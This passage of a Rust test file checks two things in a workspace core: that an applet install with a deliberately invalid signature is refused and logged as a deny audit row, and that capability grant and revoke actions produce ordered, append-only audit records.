        "limits": { "wall_ms": 3000, "fuel": 10000000, "memory_bytes": 67108864, "max_host_calls": 10000, "storage_bytes": 10485760, "log_bytes": 262144 }
    });
    // A signature object that fails verification (no real package/keys), carrying the
    // signer provenance + the structured refusal context the producer records.
    let resp = core.handle(owner_cmd(
        "applet.install",
        "app.unknown-signed-field",
        json!({
            "manifest": manifest,
            "sources": { "src/main.ts": "export async function main(ctx:any,input:any){ return { ok:true }; }" },
            "signature": {
                "package": { "manifest": {}, "files": [], "hashes": {} },
                "signature": "ed25519:not-a-real-signature",
                "public_key": "ed25519:not-a-real-key",
                "signature_meta": { "key_id": "test-ed25519-2026-06", "signed_at": "2026-06-13T00:00:00Z" },
                "refusal": { "field": "capabilities.futureDangerousGrant", "error_kind": "SignaturePolicyError" }
            }
        }),
    ));
    assert!(!resp.ok, "the malformed signature must refuse the install");

    let rows = core
        .store()
        .query_audit(&AuditQuery::by_action("package.install.refused"))
        .unwrap();
    assert_eq!(rows.len(), 1, "exactly one signing refusal row: {rows:?}");
    let row = &rows[0];
    assert_eq!(row.producer, "signing");
    assert_eq!(row.decision, "deny");
    assert_eq!(row.actor_id, "actor-owner-1");
    assert_eq!(row.resource_type, "package");
    assert_eq!(row.resource_id.as_deref(), Some("app.unknown-signed-field"));
    let meta = row.metadata.as_object().unwrap();
    assert_eq!(meta.get("command").unwrap(), "applet.install");
    assert_eq!(meta.get("key_id").unwrap(), "test-ed25519-2026-06");
    assert_eq!(meta.get("field").unwrap(), "capabilities.futureDangerousGrant");
    assert_eq!(meta.get("error_kind").unwrap(), "SignaturePolicyError");
    // The refused package was NOT installed (the refusal preceded any state write).
    assert!(core.store().query_audit(&AuditQuery::by_decision("allow")).unwrap().is_empty());
}

#[test]
fn permission_grant_revoke_persists_ordered_rows_through_live_admin_api() {
    // The REAL capability-grant admin API (a workspace-membership provisioning seam)
    // lands ordered `permission.grant` then `permission.revoke` rows with strictly
    // increasing seq.
    let mut core = WorkspaceCore::in_memory("ws-perm").unwrap();
    let grant = core
        .grant_capability("actor-owner-1", "actor-editor-1", "db", "write", "collection:tasks")
        .unwrap();
    let revoke = core
        .revoke_capability("actor-owner-1", "actor-editor-1", "db", "write", "collection:tasks")
        .unwrap();
    assert!(revoke.seq > grant.seq, "revoke seq strictly after grant");

    let rows = core
        .store()
        .query_audit(&AuditQuery::by_resource_id("db.write:collection:tasks"))
        .unwrap();
    assert_eq!(rows.len(), 2, "grant + revoke rows: {rows:?}");
    assert_eq!(rows[0].action, "permission.grant");
    assert_eq!(rows[0].decision, "allow");
    assert_eq!(rows[0].actor_id, "actor-owner-1");
    assert_eq!(rows[0].resource_type, "capability");
    assert_eq!(rows[0].collection.as_deref(), Some("tasks"));
    let g_meta = rows[0].metadata.as_object().unwrap();
    assert_eq!(g_meta.get("target_actor_id").unwrap(), "actor-editor-1");
    assert_eq!(g_meta.get("namespace").unwrap(), "db");
    assert_eq!(g_meta.get("capability_action").unwrap(), "write");
    assert_eq!(rows[1].action, "permission.revoke");
    assert!(rows[1].seq > rows[0].seq, "grant row precedes revoke row");

    // APPEND-ONLY: re-running grant→revoke appends two MORE rows; prior ones untouched.
    let first_ids: Vec<String> = rows.iter().map(|r| r.audit_id.clone()).collect();
    core.grant_capability("actor-owner-1", "actor-editor-1", "db", "write", "collection:tasks")
        .unwrap();
    core.revoke_capability("actor-owner-1", "actor-editor-1", "db", "write", "collection:tasks")
        .unwrap();
    let after = core
        .store()
        .query_audit(&AuditQuery::by_resource_id("db.write:collection:tasks"))
        .unwrap();
    assert_eq!(after.len(), 4, "the re-run appended two more rows");
    assert_eq!(after[0].audit_id, first_ids[0], "prior rows untouched (append-only)");
    assert_eq!(after[1].audit_id, first_ids[1]);
}
